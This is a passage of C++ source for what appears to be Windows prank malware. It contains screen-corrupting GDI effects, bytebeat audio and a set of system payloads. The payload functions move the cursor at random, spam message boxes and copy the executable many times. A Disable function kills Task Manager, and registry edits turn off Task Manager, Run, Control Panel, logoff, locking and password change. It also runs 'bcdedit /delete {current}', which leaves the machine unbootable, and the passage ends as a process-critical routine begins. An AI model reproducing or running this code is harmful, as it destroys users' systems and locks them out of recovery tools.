                signX = -1;
            }

            if (y == 0)
            {
                signY = 1;
            }

            if (x == 0)
            {
                signX = 1;
            }

            Sleep(1);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
    }

    DWORD WINAPI IconsE(LPVOID lpParam)
    {
        HICON hApplicationIcon;
        int x = 10;
        int y = 10;
        int incrementor = rand() % 40;

        int signX = -1;
        int signY = -1;

        while (true)
        {
            HDC hdc = GetDC(HWND_DESKTOP);

            x += incrementor * signX;
            y += incrementor * signY;

            HINSTANCE lib = LoadLibraryA("imageres.dll");
            hApplicationIcon = LoadIcon(lib, MAKEINTRESOURCE(rand() % 113));

            int IconWidth = rand() % 100;
            int IconHeight = rand() % 100;

            DrawIconEx
            (
                hdc,
                rand() % w, rand() % h,
                hApplicationIcon,
                IconWidth, IconHeight,
                0,
                NULL, DI_NORMAL
            );

            if (y >= h)
            {
                signY = -1;
            }

            if (x >= w)
            {
                signX = -1;
            }

            if (y == 0)
            {
                signY = 1;
            }

            if (x == 0)
            {
                signX = 1;
            }

            Sleep(1);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
    }

    DWORD WINAPI MythlasAthomeRemasted(LPVOID lpParam)
    {
        while (1)
        {
            HDC hdc = GetDC(0);
            HDC dcCopy = CreateCompatibleDC(hdc);

            HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(dcCopy, bm);
            RECT rect;
            
            GetWindowRect(GetDesktopWindow(), &rect);
            
            POINT pt[3];
            
            int inc3 = rand() % 30;
            int v = rand() % 2;
            if (v == 1) inc3 = -30;

            inc3++;
            
            pt[0].x = rect.left - inc3;
            pt[0].y = rect.top + inc3;
            pt[1].x = rect.right - inc3;
            pt[1].y = rect.top - inc3;
            pt[2].x = rect.left + inc3;
            pt[2].y = rect.bottom - inc3;

            PlgBlt
            (
                dcCopy, pt, hdc,
                rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top,
                0, 0, 0
            );

            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, rand() % 20, rand() % 20, w, h, dcCopy, rand() % 20, rand() % 20, PATPAINT);
            DeleteObject(brush);
            DeleteObject(dcCopy); DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }


    DWORD WINAPI RGBMasher(LPVOID lpParam)
    {
        while (true)
        {
            HDC hdc = GetDC(0);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            
            BitBlt
            (
                hdc,
                rand() % 30, rand() % 30, rand() % w, rand() % h,
                hdc,
                rand() % 30, rand() % 30,
                GLITCH
            );
            
            Sleep(1);

            DeleteObject(brush);
            ReleaseDC(0, hdc);
        }
    }

    DWORD WINAPI RainbowInvert(LPVOID lpParam)
    {
        int state = 0;
        int r = 255;
        int g = 0;
        int b = 0;

        while (true)
        {
            if (state == 0)
            {
                g += 5; if (g >= 255) state = 1;
            }

            else if (state == 1)
            {
                r -= 5; if (r <= 0) state = 2;
            }

            else if (state == 2)
            {
                b += 5; if (b >= 255) state = 3;
            }

            else if (state == 3)
            {
                g -= 5; if (g <= 0) state = 4;
            }

            else if (state == 4)
            {
                r += 5; if (r >= 255) state = 5;
            }

            else if (state == 5)
            {
                b -= 5; if (b <= 0) state = 0;
            }

            COLORREF hue = RGB(r, g, b);
            HBRUSH brush = CreateSolidBrush(hue);

            HDC hdc = GetDC(NULL);
            SelectObject(hdc, brush);

            BitBlt(hdc, 5, 5, w, h, hdc, 0, 0, SRCRAINBOW);

            ReleaseDC(NULL, hdc);
            Sleep(1);
        }
    }

    DWORD WINAPI MoreBlur(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(dcCopy, bmp);

        BLENDFUNCTION blur = { 0 };

        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 50;

        int a = 0;
        int b = 0;
        int c = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            BitBlt(dcCopy, 0, 0, w, h, hdc, b, c, SRCCOPY);
            AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
            a += 1;
            b = tan(a / 21.f) * 50;
            c = cos(a / 20.f) * 50;
            ReleaseDC(0, hdc);
        }
    }

    DWORD WINAPI GDIShader9(LPVOID lpParam)
    {
        HDC hdc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;

        PRGBQUAD_t prgbDst = nullptr;
        HBITMAP hbmDst = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbDst, NULL, 0);
        SelectObject(dcCopy, hbmDst);

        PRGBQUAD_t prgbSrc =
            (PRGBQUAD_t)VirtualAlloc(NULL, w * h * sizeof(RGBQUAD_t), MEM_ALLOC_TYPES, PAGE_READWRITE);

        int t = 0;

        while (true)
        {
            BitBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            memcpy(prgbSrc, prgbDst, w * h * sizeof(RGBQUAD_t));

            int offsetX = (int)(sinf(t * 0.04f) * 18.0f);
            int offsetY = (int)(cosf(t * 0.03f) * 18.0f);

            for (int y = 0; y < h; y += 2)
            {
                int srcY = (y + offsetY) % h;
                if (srcY < 0) srcY += h;

                for (int x = 0; x < w; x += 2)
                {
                    int srcX = (x + offsetX) % w;
                    if (srcX < 0) srcX += w;

                    RGBQUAD_t pixel = prgbSrc[srcY * w + srcX];

                    int fractalVal = (x ^ y ^ t) & 0xFF;

                    pixel.color.r = (BYTE)((pixel.color.r ^ fractalVal) + 30);
                    pixel.color.g = (BYTE)(pixel.color.g * 0.15f);
                    pixel.color.b = (BYTE)(pixel.color.b * 0.15f);

                    for (int by = 0; by < 2; by++)
                    {
                        for (int bx = 0; bx < 2; bx++)
                        {
                            int targetX = x + bx;
                            int targetY = y + by;

                            if (targetX < w && targetY < h)
                            {
                                prgbDst[targetY * w + targetX] = pixel;
                            }
                        }
                    }
                }
            }

            BitBlt(dcCopy, 2, 2, w - 2, h - 2, dcCopy, 0, 0, SRCPAINT);

            BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, SRCCOPY);

            t++;
            Sleep(10);
        }

        VirtualFree(prgbSrc, 0, MEM_RELEASE);
        DeleteObject(hbmDst);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, hdc);

        return 0;
    }

    DWORD WINAPI MoreMythlasAthome(LPVOID lpParam)
    {
        while (1)
        {
            HDC hdc = GetDC(0);
            HDC dcCopy = CreateCompatibleDC(hdc);

            HBITMAP bm = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(dcCopy, bm);
            RECT rect;

            GetWindowRect(GetDesktopWindow(), &rect);

            POINT pt[3];

            int inc3 = rand() % 30;
            int v = rand() % 2;
            if (v == 1) inc3 = -30;

            inc3++;

            pt[0].x = rect.left - inc3;
            pt[0].y = rect.top + inc3;
            pt[1].x = rect.right - inc3;
            pt[1].y = rect.top - inc3;
            pt[2].x = rect.left + inc3;
            pt[2].y = rect.bottom - inc3;

            PlgBlt
            (
                dcCopy, pt, hdc,
                rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top,
                0, 0, 0
            );

            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, rand() % 20, rand() % 20, w, h, dcCopy, rand() % 20, rand() % 20, SRCRAINBOW);
            DeleteObject(brush);
            DeleteObject(dcCopy); DeleteObject(bm);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }
}

namespace Bytebeats
{
    DWORD WINAPI Sound1(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)(t * (t >> 7 | t >> 8 & t >> 4) + ((t | t >> 1 | t >> 7) * t + (t >> 11 | t >> 8)));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound2(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
               (unsigned char)((t * t + (1 * (t >> 9 & t >> 8)) & 128) + (t >> 5));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound3(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
                (unsigned char)((t * (t >> 7 | t | t >> 9 | t >> 12) * t));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound4(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_B, SAMPLE_RATE_B, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_B);

        for (int t = 0; t < BUFFER_SIZE_B; ++t)
        {
            buffer[t] =
            (unsigned char)((t >> 5 | (t >> 2) * (t >> 5)) + ((t * (t >> 13 | t >> 8) | t >> 16 ^ t) + 64));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound5(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)((t >> t) + (100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11))));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound6(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)
            (
                (t >> (((t / 8 | 0) ^ (t / 8 | 0) - 1280) % 11 * t / 2 & 127) +
                (((t / 512 | 0) ^ (t / 500 | 0) - 2) % 13 * t / 3 & 127)) * 5
            );
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound7(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
                (unsigned char)
                (
                    (t * 3 + (t ^ (t * (t >> 4 | t >> 8)))) +
                    ((((t * (t >> 5 & t >> 6)) >> (7 & t >> 13)) * 100) - t)
                );
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound8(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_C, SAMPLE_RATE_C, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_C);

        for (int t = 0; t < BUFFER_SIZE_C; ++t)
        {
            buffer[t] =
            (unsigned char)
            (
                ((((2 * t & (t & 255 ? -t : t) >> 8 & (t & 256 ? -t : t) >> 6)) * 10) + (t >> 1)) & 128
            );
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound9(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)
            (
                ((((2 * t % 2556) / (1 + (t >> 10 &
                (t / (1 + (t / 16 & 8192 ? 2 : 4)) & 16 ? 31 : 120)))) * t) >> 5) + (t * (61 ^ t >> 5))
            );
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound10(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_B, SAMPLE_RATE_B, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_B);

        for (int t = 0; t < BUFFER_SIZE_B; ++t)
        {
            buffer[t] =
            (unsigned char)
            ((t >> 6 ^ t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4
            ^ -t & -t >> 13) % 128 ^ -t >> 1) + (t >> 6));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound11(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
                (unsigned char)((t * (t >> 5 | t >> 4) >> (t >> 16)) + (t * (t & t >> 5)));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound12(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)((t * t >> (t / 256)) + (t & t >> 8));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound13(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_B, SAMPLE_RATE_B, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_B);

        for (int t = 0; t < BUFFER_SIZE_B; ++t)
        {
            buffer[t] =
            (unsigned char)(((t & t >> 12) * (t >> 4 | t >> 8)) + (t >> 5 | (t >> 2) * (t >> 5)));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound14(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)
            (((t * t / (1 + (t >> 9 & t >> 8))) & 128) +
            ((((t * (t >> 5 & t >> 6)) >> (7 & t >> 13)) * 100) - t));
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound15(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_C, SAMPLE_RATE_C, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_C);

        for (int t = 0; t < BUFFER_SIZE_C; ++t)
        {
            buffer[t] =
            (unsigned char)
            (
                (t >> 5 | (t >> 2) * (t >> 5)) +
                (t >> 6 ^ t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 ^ -t >> 1)
            );
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }

    DWORD WINAPI Sound16(LPVOID lpvd)
    {
        HWAVEOUT hWaveOut;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, SAMPLE_RATE_A, SAMPLE_RATE_A, 1, 8, 0 };

        if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        {
            return 1;
        }

        std::vector<unsigned char> buffer(BUFFER_SIZE_A);

        for (int t = 0; t < BUFFER_SIZE_A; ++t)
        {
            buffer[t] =
            (unsigned char)
            (((t * ((t >> 9 | t >> 13) & 15)) & 129) + (t - (t >> 4 & t >> 8) & t >> 12) - 1);
        }

        WAVEHDR header = { (LPSTR)buffer.data(), (DWORD)buffer.size(), 0, 0, 0, 0, 0, 0 };

        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE))
        {
            Sleep(100);
        }

        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        return 0;
    }
}

void Redraw()
{
    RedrawWindow(0, 0, 0, 133);
    Sleep(500);
}

LPCWSTR GetCurrentFileDir()
{
    WCHAR buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);

    return (LPCWSTR)buffer;
}

namespace System
{
    DWORD WINAPI CreateFractalizedVideo(LPVOID lpvd) // credits to Pankoza
    {
        CreateDirectoryA("C:\\fuck", 0);
        DWORD dwBytesWritten;
        
        HANDLE hDevice =
        CreateFileW
        (
            L"C:\\fuck\\fuck.mp4", GENERIC_ALL,
            FILE_CREATE, 0,
            CREATE_ALWAYS,
            0, 0
        );

        WriteFile(hDevice, Fractalized, 294912, &dwBytesWritten, 0);
        CloseHandle(hDevice);
        ShellExecute(0, 0, L"C:\\fuck\\fuck.mp4", 0, 0, SW_SHOW);
        return 0;
    }

    DWORD WINAPI MoveCursor(LPVOID lpParam)
    {
        POINT pt;

        while (true)
        {
            if (GetCursorPos(&pt))
            {
                int dx = rand() % 11 - 5; // random between -5 and 5
                int dy = rand() % 11 - 5; // random between -5 and 5
                SetCursorPos(pt.x + dx, pt.y + dy);
            }

            Sleep(1);
        }

        return 0;

    }

    DWORD WINAPI KeyboardCAPS(LPVOID lpvd)
    {
        while (true)
        {
            PressKey(VK_CAPITAL, 50);
            PressKey(VK_SCROLL, 50);
        }

        return 0;
    }

    DWORD WINAPI MessedLabels(LPVOID lpvd)
    {
        while (true)
        {
            HWND hwnd = FindWindowW(NULL, L"I WANT TO MAKE POOP" + rand() % 128);
            EnumChildWindows(hwnd, EnumChildProc, NULL);
        }
    }

    DWORD WINAPI MoveWindow(LPVOID lpParam)
    {
        srand((unsigned)time(0));
        
        while (true)
        {
            EnumWindows(WindowsMoving, 0);
        }
        
        return 0;
    }

    DWORD WINAPI Msgbox(LPVOID lpParam)
    {
        while (1)
        {
            MessageBoxA(0, "FERIFJEROJEOJJWSD", "DIEOFEO - Error", MB_OK | MB_ICONERROR);
            Sleep(100);
            MessageBoxA(0, "oh", "oh", MB_OK | MB_ICONWARNING);
            Sleep(100);
        }
    }

    DWORD WINAPI MessDesktop(LPVOID lpvd)
    {
        for (int i = 0; i < 256; i++)
        {
            CopyFile(GetCurrentFileDir(), (WCHAR*)L"Oh" + i, true);
        }

        return 0;
    }

    DWORD WINAPI Disable(LPVOID lpvd)
    {
        system("taskkill /f /im taskmgr.exe");
        system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
        system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
        system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
        system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
        system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
        system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
        system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
        system("bcdedit /delete {current}");
        return 1;
    }

    BOOL ProcessIsCritical()
    {
        HANDLE hDLL;
